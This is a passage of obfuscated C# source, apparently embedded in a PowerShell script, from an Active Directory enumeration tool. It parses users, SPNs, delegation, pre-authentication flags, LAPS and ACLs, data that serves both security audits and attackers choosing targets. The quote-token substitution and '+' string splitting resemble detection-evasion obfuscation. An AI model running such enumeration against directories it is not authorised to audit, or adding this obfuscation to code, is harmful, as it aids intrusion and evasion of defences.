            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/'+'openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<string, string> Replacements = new Dictionary<string, string>()
        {
            //{System.Environment.NewLine, lEzjlEzj},
            //{lEzj,lEzj, lEzj;lEzj},
            {lEzjcnIlEzjlEzj, lEzjxfJ4lEzj}
        };

        public static string CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            string CleanedString = string.Join(lEzj lEzj, ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (string Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties[lEzjms-mcs-admpwdexpirationtimelEzj].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] DomainControllerParser(Object[] AdDomainControllers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdDomainControllers, numOfThreads, lEzjDomainControllerslEzj);
            return ADRObj;
        }

        public static Object[] SchemaParser(Object[] AdSchemas, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdSchemas, numOfThreads, lEzjSchemaHistorylEzj);
            return ADRObj;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, lEzjUs'+'erslEzj);
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, lEzjUserSPNslEzj);
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, lEzjGroupslEzj);
            '+'return ADRObj;
        }

        public static Object[] GroupChangeParser(Object[] AdGroups, DateTime Date1, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, lEzjGroupChangeslEzj);
            return ADRObj;
        }

  '+'      public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, string DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<string, string>();
            runProcessor(AdGroups, numOfThreads, lEzjGroupsDictionarylEzj);
            L'+'DAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, lEzjGroupMemberslEzj);
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, lEzjOUslEzj);
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, lEzjGPOslEzj);
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<string, string>();
            runProcessor(AdGPOs, nu'+'mOfThreads, lEzjGPOsDictionarylEzj);
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, lEzjSOMslEzj);
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, lEzjPrinterslEzj);
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
           '+' LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LD'+'APClas'+'s.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, lEzjComputerslEzj);
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, lEzjComputerSPNslEzj);
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOf'+'Threads, lEzjLAPSlEzj);
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary'+' = new Dictionary<string, string>();
            runProcessor(ADObjects, numOfThreads, lEzjSIDDictionarylEzj);
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, lEzjDACLslEzj);
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, lEzjSACLslEzj);
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPer'+'Thread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Ar'+'ray.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resul'+'tsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(string name)
        {
            switch (name)
            {
                case lEzjDomainControllerslEzj:
                    return new DomainControllerRecordProcessor();
                case lEzjSchemaHistorylEzj:
                    return new SchemaRecordProcessor();
                case lEzjUserslEzj:
                    return new UserRecordProcessor();
                case lEzjUserSPNslEzj:
                    return new UserSPNRecordProcessor();
                case lEzjGroupslEzj:
                    return new GroupRecordProcessor();
                case lEzjGroupChangeslEzj:
                    return new GroupChangeRecordProcessor();
                case lEzjGroupsDictionarylEzj:
                    return new GroupRecordDictionaryProcessor();
                case lEzjGroupMemberslEzj:
                    return new GroupMemberRecordProcessor();
                case lEzjOUslEzj:
                    return new OURecordProcessor();
                case lEzjGPOslEzj:
                    return new GPORecordProcessor();
                case lEzjGPOsDictionarylEzj:
                    return new GPORecordDictionaryProcessor();
                case lEzjSOMslEzj:
                    ret'+'u'+'rn new SOMRecordProcessor();
                case lEzjPrinterslEzj:
                    return new PrinterRecordProcessor();
                case lEzjComputerslEzj:
                    return new ComputerRecordProcessor();
                case lEzjComputerSPNslEzj:
                    return new ComputerSPNRecordProcessor();
                case lEzjLAPSlEzj:
                    return new LAPSRecordProcessor();
                case lEzjSIDDictionarylEzj:
                    return new SIDRecordDictionaryProcessor();
                case lEzjDACLslEzj:
                    return new DACLRecordProcessor();
                case lEzjSACLslEzj:
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException(lEzjInvalid processor type lEzj + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    System.DirectoryServices.ActiveDirectory.DomainControl'+'ler AdDC = (System.DirectoryServices.ActiveDirectory.DomainController) record;
                    bool? Infra = false;
                    bool? Naming = false;
                    bool? Schema = false;
                    bool? RID = false;
                    bool? PDC = false;
                    string Domain = null;
                    string Site = null;
                    string OperatingSystem = null;
                    PSObject DCSMBObj = new PSObject();

                    try
                    {
                        Domain = AdDC.Domain.ToString();
                        foreach (var OperationMasterRole in (System.DirectoryServices.ActiveDirectory.ActiveDirectoryRoleCollection) AdDC.Roles)
                        {
                            switch (Op'+'erationMasterRole.ToString())
                            {
                                case lEzjInfrastructureRolelEzj:
                                Infra = true;
                                break;
                                case lEzjNamingRolelEzj:
                                Naming = true;
                                break;
                                case lEzjSchemaRolelEzj:
                                Schema = true;
                                break;
                                case lEzjRidRolelEzj:
                                RID = true;
                                break;
                                case lEzjPdcRolelEzj:
                                PDC = true;
                                break;
                            }
                        }
                        Site = AdDC.SiteName;
                        OperatingSystem = AdDC.OSVersion.ToString();
                    }
                    catch (System.DirectoryServices.ActiveDirectory.ActiveDirectoryServerDownException)// e)
                    {
                        //Console.WriteLine(lEzjException caught: {0}lEzj, e);
                        Infra = null;
                        Naming = null;
                        Schema = null;
                        RID = null;
                        PDC = null;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty(lEzjDomainlEzj, Domain));
                    DCObj.Members.Add(new PSNoteProperty(lEzjSitelEzj, Site));
                    DCObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, Convert.ToString(AdDC.Name).Split(xfJ4.xfJ4)[0]));
                    DCObj.Members.Add(new PSNoteProperty(lEzjIPv4AddresslEzj, AdDC.IPAddress));
                    DCObj.Members.Add(new PSNoteProperty(lEzjOperating SystemlEzj, OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty(lEzjHostnamelEzj, AdDC.Name));
                    DCObj.Members.Add(new PSNoteProperty(lEzjInfralEzj, Infra));
                    DCObj.Members.Add(new PSNoteProperty(lEzjNaminglEzj, Naming));
                    DCObj.Members.Add(new PSNoteProperty(lEzjSchemalEzj, Schema));
                    DCObj.Members.Add(new PSNoteProperty(lEzjRIDlEzj, RID));
                    DCObj.Members.Add(new PSNoteProperty(lEzjPDClEzj, PDC));
                    if (AdDC.IPAddress != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.IPAddress);
                    }
      '+'      '+'        else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty(lEzjSMB Port OpenlEzj, false));
                    }
                    foreach (PSProper'+'tyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == lEzjSMB Port OpenlEzj && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB1(NT LM 0.12)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0202)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB2(0x0210)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0300)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0302)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB3(0x0311)lEzj, null));
                            DCObj.Members.Add(new PSNoteProperty(lEzjSMB SigninglEzj, null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSchema = (SearchResult) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjObjectClasslEzj, AdSchema.Properties[lEzjobjectclasslEzj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdSchema.Properties[lEzjnamelEzj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdSchema.Properties[lEzjwhencreatedlEzj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdSchema.Properties[lEzjwhenchangedlEzj][0]));
                    SchemaObj.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdSchema.Properties[lEzjdistinguishednamelEzj][0]));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
             '+'       return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
           '+'     {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafte'+'rMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    string SIDHistory = lEzjlEzj;
         '+'           bool? HasSPN = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties[lEzjuseraccountcontrollEzj].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties[lEzjuseraccountcontrollEzj][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpire'+'d = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
     '+'                   TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties[lEzj'+'msds-supportedencryptiontypeslEzj].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties[lEzjmsds-supportedencryptiontypeslEzj][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties[lEzjntsecuritydescriptorlEzj].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties[lEzjntsecuritydescriptorlEzj][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (Activ'+'eDirectoryAccessRule Rule in AccessRules)
       '+'                 {
                            if ((Convert.ToString(Rule.ObjectType)).Equals(lEzjab721a53-1e2f-11d0-9819-00aa0040529blEzj))
                            {
    '+'                            if (Rule.AccessControlType.ToString() == lEzjDenylEzj)
                                {
                                    string ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == lEzjEveryonelEzj)
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == lEzjNT AUTHORITYcnIcnISELFlEzj)
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties[lEzjlastlogontimestamplEzj].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties[lEzjlastlogontimestamplEzj][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties[lEzjpwdLastSetlEzj].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties[lEzjpwdlastsetlEzj][0]) == lEzj0lEzj)
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties[lEzjpwdlastsetlEzj][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxA'+'ge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if (AdUser.Properties[lEzjaccountExpireslEzj].Count != 0)
                    {
                        if ((Int64) AdUser.Properties[lEzjaccountExpireslEzj][0] != (Int64) 9223372036854775807)
                        {
                            if ((Int64) AdUser.Properties[lEzjaccountExpireslEzj][0] != (Int64) 0)
                            {
                                try
                                {
                                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                    AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties[lEzjaccountExpireslEzj][0]));
                          '+'          AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                                }
                                catch //(Exception e)
                                {
                                    //    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                                }
                            }
                        }
                    }
                    if '+'(AdUser.Properties[lEzjuseraccountcontrollEzj].Count != 0)
                    {
                        if ((bool) TrustedforDelegation)
                        {
                            DelegationType = lEzjUnconstrainedlEzj;
                            DelegationServices = lEzjAnylEzj;
                        }
                        if (AdUser.Properties[lEzjmsDS-AllowedToDelegateTolEzj].Count >= 1)
                        {
                            DelegationType = lEzjConstrainedlEzj;
                            for (int i = 0; i < AdUser.Properties[lEzjmsDS-AllowedToDelegateTolEzj].Count; i++)
                            {
                                var delegateto = AdUser.Properties[lEzjmsDS-AllowedToDelegateTolEzj][i];
                                DelegationServices = DelegationServices + lEzj,lEzj + Convert.ToString(delegateto);
                            }
  '+'                          DelegationServices = DelegationServices.TrimStart(xfJ4,xfJ4);
                        }
                        if ((bool) TrustedtoAuthforDelegation)
                        {
                            DelegationProtocol = lEzjAnylEzj;
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = lEzjKerberoslEzj;
                        }
                    }
                    if (AdUser.Properties[lEzjsidhistorylEzj].Count >= 1)
                    {
                        string sids = lEzjlEzj;
       '+'                 for (int i = 0; i < AdUser.Properties[lEzjsidhistorylEzj].Count; i++)
                        {
   '+'                         var history = AdUser.Properties[lEzjsidhistorylEzj][i];
                            sids = sids + lEzj,lEzj + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(xfJ4,xfJ4);
                    }
                    if (AdUser.Properties[lEzjserviceprincipalnamelEzj].Count == 0)
                    {
                        HasSPN = false;
                    }
                    else if (AdUser.Properties[lEzjserviceprincipalnamelEzj].Count > 0)
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty(lEzjUserNamelEzj, (AdUser.Properties[lEzjsamaccountnamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjsamaccountnamelEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, (AdUser.Properties[lEzjnamelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjnamelEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjEnabledlEzj, Enabled));
                    UserObj.Members.Add(new PSNoteProperty(lEzjMust Change Password at LogonlEzj, MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCannot Change PasswordlEzj, CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Never ExpireslEzj, PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty(lEzjReversible Password EncryptionlEzj, ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty(lEzjSmartcard Logon RequiredlEzj, SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDelegation PermittedlEzj, DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty(lEzjKerberos DES OnlylEzj, UseDESKeyOnly));
       '+'             UserObj.Members.Add(new PSNoteProperty(lEzjKerberos RC4lEzj, KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty(lEzjKerberos AES-128bitlEzj, KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty(lEzjKerberos AES-256bitlEzj, KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDoes Not Require Pre AuthlEzj, DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty(lEzjNever Logged inlEzj, NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLogon Age (days)lEzj, DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Age (days)lEzj, DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDormant (> lEzj + DormantTimeSpan + lEzj days)lEzj, Dormant));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Age (> lEzj + PassMaxAge + lEzj days)lEzj, PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAccount Locked OutlEzj, AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword ExpiredlEzj, PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword Not RequiredlEzj, PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDelegation TypelEzj, DelegationType));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDelegation ProtocollEzj, DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDelegation ServiceslEzj, DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLogon WorkstationslEzj, (AdUser.Properties[lEzjuserworkstationslEzj].Count != 0 ? AdUser.Properties[lEzjuserworkstationslEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAdminCountlEzj, (AdUser.Properties[lEzjadmincountlEzj].Count != 0 ? AdUser.Properties[lEzjadmincountlEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPrimary GroupIDlEzj, (AdUser.Properties[lEzjprimarygroupidlEzj].Count != 0 ? AdUser.Properties[lEzjprimarygroupidlEzj][0] : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjSIDlEzj, Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties[lEzjobjectSIDlEzj][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty(lEzjSIDHistorylEzj, SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty(lEzjHasSPNlEzj, HasSPN));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDescri'+'ptionlEzj, (AdUser.Properties[lEzjDescriptionlEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjDescriptionlEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjTitlelEzj, (AdUser.Properties[lEzjTitlelEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjTitlelEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjDepartmentlEzj, (AdUser.Properties[lEzjDepartmentlEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjDepartmentlEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjCompanylEzj, (AdUser.Properties[lEzjCompanylEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjCompanylEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjManagerlEzj, (AdUser.Properties[lEzjManagerlEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjManagerlEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjInfolEzj, (AdUser.Properties[lEzjinfolEzj].Count != 0 ? CleanString(AdUser.Properties[lEzjinfolEzj][0]) : lEzjlEzj)));
                    UserObj.Members.Add(new PSNoteProperty(lEzjLast Logon DatelEzj, LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty(lEzjPassword LastSetlEzj, PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAccount Expiration DatelEzj, AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty(lEzjAccount Expiration (days)lEzj, AccountExpirationNumofDays));
